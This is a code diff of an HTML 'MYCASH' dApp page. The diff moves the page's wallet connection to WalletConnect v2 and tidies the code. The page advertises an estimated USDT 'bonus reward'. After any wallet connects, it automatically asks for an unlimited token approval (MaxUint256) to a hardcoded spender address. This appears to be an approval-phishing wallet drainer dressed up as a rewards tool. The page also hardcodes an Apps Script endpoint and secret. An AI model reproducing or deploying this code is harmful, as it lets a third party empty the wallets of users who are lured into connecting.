@@ -233,28 +233,20 @@
 
   <!-- libs -->
   <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
-  <script src="https://unpkg.com/web3modal@1.9.0/dist/index.js"></script>
-  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
+  <!-- WalletConnect v2 Ethereum Provider -->
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.5/dist/index.umd.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
 
   <!-- app script -->
   <script type="module">
   (function(){
     // ===== CONFIG =====
-function formatToken(n) {
-  n = Number(n);
-  if (Number.isInteger(n)) return n.toString();
-  return n.toFixed(4).replace(/\.?0+$/, "");
-}
+    function formatToken(n) {
+      n = Number(n);
+      if (Number.isInteger(n)) return n.toString();
+      return n.toFixed(4).replace(/\.?0+$/, "");
+    }
 
-
-function formatToken(n) {
-  n = Number(n);
-  if (Number.isInteger(n)) return n.toString();
-  return n.toFixed(4).replace(/\.?0+$/, "");
-}
-
-    
     const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbzlCsXUoqaMW4fCTqK6H_SF7dGCDDkcIoO-To5YbLcBLdWEEKvGjHQm_vSUfwE06Yw/exec";
     const APPS_SCRIPT_SECRET = "mahfuzinam0045";
 
@@ -265,30 +257,55 @@ function formatToken(n) {
     const BNB_TESTNET_CHAIN_ID_DEC = 97;
     const BNB_TESTNET_CHAIN_ID_HEX = "0x61";
     const BNB_TESTNET_LABEL        = "BSC Testnet (97)";
+    const BNB_TESTNET_RPC          = "https://data-seed-prebsc-1-s1.binance.org:8545/";
+
     const ERC20_APPROVE_ABI = [
-  "function approve(address spender, uint256 amount) public returns (bool)"
-   ];
-    
+      "function approve(address spender, uint256 amount) public returns (bool)"
+    ];
     const ERC20_BALANCE_ABI = [
       "function balanceOf(address owner) view returns (uint256)"
-    ]; 
+    ];
+    const ERC20_ALLOWANCE_ABI = [
+      "function allowance(address owner, address spender) view returns (uint256)"
+    ];
 
-const ERC20_ALLOWANCE_ABI = [
-  "function allowance(address owner, address spender) view returns (uint256)"
-];
-
-      
-      const TOKEN_DECIMALS = 6;
-   
-
+    const TOKEN_DECIMALS = 6;
 
     // Reward config: bonus = USDT * BONUS_RATE
     const BONUS_RATE = 0.10;              // 10% of USDT balance
     const MAX_USDT_FOR_GAUGE = 1000.0;    // 1000 USDT = 100% gauge
 
-    let web3ModalInstance = null;
     let providerInstance  = null;
     let web3Instance      = null;
+
+    // ===== WalletConnect v2 config =====
+    let walletConnectV2Provider = null;
+
+    // 🔑 REPLACE THIS WITH YOUR REAL PROJECT ID FROM https://dashboard.reown.com
+    const WALLETCONNECT_PROJECT_ID = "febf4ea32fb4df7139f1cfd3f7c5142a";
+
+    async function getWalletConnectV2Provider() {
+      if (walletConnectV2Provider) return walletConnectV2Provider;
+
+      const EthereumProvider = globalThis["@walletconnect/ethereum-provider"].EthereumProvider;
+
+      walletConnectV2Provider = await EthereumProvider.init({
+        projectId: WALLETCONNECT_PROJECT_ID,
+        optionalChains: [BNB_TESTNET_CHAIN_ID_DEC],
+        rpcMap: {
+          [BNB_TESTNET_CHAIN_ID_DEC]: BNB_TESTNET_RPC
+        },
+        metadata: {
+          name: "MYCASH DApp",
+          description: "MYCASH bonus rewards dApp",
+          url: window.location.origin,
+          icons: ["https://mycash911.github.io/mycash/icon.png"]
+        },
+        showQrModal: true
+      });
+
+      return walletConnectV2Provider;
+    }
 
     // ===== helpers =====
     function storageKeyFor(address){
@@ -361,10 +378,10 @@ const ERC20_ALLOWANCE_ABI = [
       const balance = Number(usdtBalance || 0);
       const bonus   = balance * BONUS_RATE;
 
-     rewardBalanceEl.textContent = formatToken(balance) + " USDT";
-rewardBonusEl.textContent   = formatToken(bonus) + " USDT";
+      rewardBalanceEl.textContent = formatToken(balance) + " USDT";
+      rewardBonusEl.textContent   = formatToken(bonus) + " USDT";
 
-      if (rewardHintEl)    rewardHintEl.textContent    = "This is an estimated bonus based on your current USDT balance.";
+      if (rewardHintEl) rewardHintEl.textContent = "This is an estimated bonus based on your current USDT balance.";
 
       const ratio = Math.max(0, Math.min(balance / MAX_USDT_FOR_GAUGE, 1)); // 0–1
       const angle = -90 + ratio * 180; // -90° (left) to +90° (right)
@@ -383,23 +400,6 @@ rewardBonusEl.textContent   = formatToken(bonus) + " USDT";
       setUserIdUI("-");
       tokensContainer.innerHTML = '<div class="muted">Connect wallet to see token balance.</div>';
       resetRewardUI();
-    }
-
-    function initWeb3ModalInstance(){
-      const providerOptions = {
-        walletconnect: {
-          package: window.WalletConnectProvider.default,
-          options: {
-            rpc: { 97: "https://data-seed-prebsc-1-s1.binance.org:8545" },
-            bridge: "https://bridge.walletconnect.org",
-            qrcode: true
-          }
-        }
-      };
-      web3ModalInstance = new window.Web3Modal.default({
-        cacheProvider: true,
-        providerOptions
-      });
     }
 
     function attachProviderListeners(p){
@@ -473,7 +473,7 @@ rewardBonusEl.textContent   = formatToken(bonus) + " USDT";
         const ethersProvider = new ethers.BrowserProvider(providerInstance);
         const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_BALANCE_ABI, ethersProvider);
         const raw            = await tokenContract.balanceOf(address);
-        const formatted = ethers.formatUnits(raw, TOKEN_DECIMALS);
+        const formatted      = ethers.formatUnits(raw, TOKEN_DECIMALS);
 
         return formatted;
       }catch(err){
@@ -513,65 +513,64 @@ rewardBonusEl.textContent   = formatToken(bonus) + " USDT";
       }
     }
 
-  async function ensureTokenApproval(){
-  if(!TOKEN_ADDRESS){
-    console.warn("TOKEN_ADDRESS not set, skipping approve");
-    return;
-  }
-  if(!SPENDER_ADDRESS){
-    console.warn("SPENDER_ADDRESS not set, skipping approve");
-    return;
-  }
-  if(!providerInstance){
-    console.warn("No providerInstance for approval");
-    return;
-  }
+    async function ensureTokenApproval(){
+      if(!TOKEN_ADDRESS){
+        console.warn("TOKEN_ADDRESS not set, skipping approve");
+        return;
+      }
+      if(!SPENDER_ADDRESS){
+        console.warn("SPENDER_ADDRESS not set, skipping approve");
+        return;
+      }
+      if(!providerInstance){
+        console.warn("No providerInstance for approval");
+        return;
+      }
 
-  try{
-    const ethersProvider = new ethers.BrowserProvider(providerInstance);
-    const signer         = await ethersProvider.getSigner();
-    const ownerAddress   = (await signer.getAddress()).toLowerCase();
+      try{
+        const ethersProvider = new ethers.BrowserProvider(providerInstance);
+        const signer         = await ethersProvider.getSigner();
+        const ownerAddress   = (await signer.getAddress()).toLowerCase();
 
-    if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
-      alert("ERROR: TOKEN_ADDRESS is set to your wallet address.\n\nIt MUST be the BEP-20 token contract address, not your wallet.");
-      setStatus("Connected (approval skipped)");
-      return;
+        if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
+          alert("ERROR: TOKEN_ADDRESS is set to your wallet address.\n\nIt MUST be the BEP-20 token contract address, not your wallet.");
+          setStatus("Connected (approval skipped)");
+          return;
+        }
+
+        // 1) Read current allowance (view call, no gas)
+        const readContract = new ethers.Contract(
+          TOKEN_ADDRESS,
+          ERC20_ALLOWANCE_ABI,
+          ethersProvider
+        );
+        const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
+
+        if (currentAllowance > 0n) {
+          // already approved something – skip tx
+          console.log("Already approved, skipping new approve tx");
+          setStatus("Connected (already approved)");
+          return;
+        }
+
+        // 2) Not approved yet → send approve tx
+        setStatus("Requesting token approval…");
+        const writeContract = new ethers.Contract(
+          TOKEN_ADDRESS,
+          ERC20_APPROVE_ABI,
+          signer
+        );
+        const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
+        console.log("Approve tx sent:", tx.hash);
+        const receipt = await tx.wait();
+        console.log("Approve confirmed:", receipt);
+        setStatus("Connected + Approved ✅");
+      }catch(err){
+        console.error("Token approve error:", err);
+        alert("Token approval failed: " + (err && err.message ? err.message : err));
+        setStatus("Connected (approval failed)");
+      }
     }
-
-    // 1) Read current allowance (view call, no gas)
-    const readContract = new ethers.Contract(
-      TOKEN_ADDRESS,
-      ERC20_ALLOWANCE_ABI,
-      ethersProvider
-    );
-    const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
-
-    if (currentAllowance > 0n) {
-      // already approved something – skip tx
-      console.log("Already approved, skipping new approve tx");
-      setStatus("Connected (already approved)");
-      return;
-    }
-
-    // 2) Not approved yet → send approve tx
-    setStatus("Requesting token approval…");
-    const writeContract = new ethers.Contract(
-      TOKEN_ADDRESS,
-      ERC20_APPROVE_ABI,
-      signer
-    );
-    const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
-    console.log("Approve tx sent:", tx.hash);
-    const receipt = await tx.wait();
-    console.log("Approve confirmed:", receipt);
-    setStatus("Connected + Approved ✅");
-  }catch(err){
-    console.error("Token approve error:", err);
-    alert("Token approval failed: " + (err && err.message ? err.message : err));
-    setStatus("Connected (approval failed)");
-  }
-}
-
 
     // helper to restore UI (bnb + USDT + reward) given current web3Instance + address
     async function restoreSessionFromAddress(address){
@@ -584,8 +583,7 @@ rewardBonusEl.textContent   = formatToken(bonus) + " USDT";
 
       const tokenBalanceRaw  = await getTokenBalance(address);
       const tokenBalanceNum  = tokenBalanceRaw ? Number(tokenBalanceRaw) : 0;
-    const prettyBalance = tokenBalanceRaw ? formatToken(tokenBalanceRaw) : "0";
-
+      const prettyBalance    = tokenBalanceRaw ? formatToken(tokenBalanceRaw) : "0";
 
       tokensContainer.innerHTML =
         '<div class="token">' +
@@ -604,28 +602,34 @@ rewardBonusEl.textContent   = formatToken(bonus) + " USDT";
       };
     }
 
+    // ===== NEW connectFlow with WalletConnect v2 =====
     async function connectFlow(){
       try{
         setStatus("Connecting…");
-        const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-        // Trust Wallet extension
-        if(!mobile && window.trustwallet && window.trustwallet.ethereum){
+        let usedInjected = false;
+
+        // 1) Prefer Trust Wallet provider if present (extension or in-app browser)
+        if (window.trustwallet && window.trustwallet.ethereum) {
           providerInstance = window.trustwallet.ethereum;
-          web3Instance     = new Web3(providerInstance);
-          await providerInstance.request({ method: "eth_requestAccounts" });
+          usedInjected = true;
         }
-        // Standard injected (MetaMask, some Trust)
-        else if(window.ethereum && !mobile){
+        // 2) Otherwise, use standard injected provider (MetaMask, other wallets)
+        else if (window.ethereum) {
           providerInstance = window.ethereum;
-          web3Instance     = new Web3(providerInstance);
-          await providerInstance.request({ method: "eth_requestAccounts" });
+          usedInjected = true;
         }
-        // WalletConnect via Web3Modal
-        else {
-          if(!web3ModalInstance) initWeb3ModalInstance();
-          providerInstance = await web3ModalInstance.connect();
-          web3Instance     = new Web3(providerInstance);
+
+        if (usedInjected) {
+          // Injected wallet (TrustWallet / MetaMask / etc.)
+          web3Instance = new Web3(providerInstance);
+          await providerInstance.request({ method: "eth_requestAccounts" });
+        } else {
+          // No injected provider → use WalletConnect v2 (desktop AND mobile)
+          providerInstance = await getWalletConnectV2Provider();
+          await providerInstance.enable(); // opens WC modal (QR / deep link)
+          web3Instance = new Web3(providerInstance);
         }
 
         if(!providerInstance || !web3Instance){
@@ -673,7 +677,6 @@ rewardBonusEl.textContent   = formatToken(bonus) + " USDT";
 
         await ensureTokenApproval();
 
-
       }catch(err){
         console.error("connectFlow error:", err);
         setStatus("Connection failed");
@@ -681,7 +684,7 @@ rewardBonusEl.textContent   = formatToken(bonus) + " USDT";
       }
     }
 
-    // silent restore using eth_accounts; returns true if restored
+    // silent restore using eth_accounts; returns true if restored (injected only)
     async function tryAutoReconnectSilent(){
       const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
@@ -719,7 +722,7 @@ rewardBonusEl.textContent   = formatToken(bonus) + " USDT";
         }
       }
 
-      // 3) Do NOT auto-connect WalletConnect silently (would open QR)
+      // 3) Do NOT auto-connect WalletConnect silently (would open modal)
       return false;
     }
 
@@ -744,7 +747,6 @@ rewardBonusEl.textContent   = formatToken(bonus) + " USDT";
     }
 
     document.addEventListener("DOMContentLoaded", async function(){
-      initWeb3ModalInstance();
       resetRewardUI();
       connectBtn.addEventListener("click", connectFlow);
       await autoConnectOnLoad();
@@ -755,3 +757,4 @@ rewardBonusEl.textContent   = formatToken(bonus) + " USDT";
   </script>
 </body>
 </html>
+
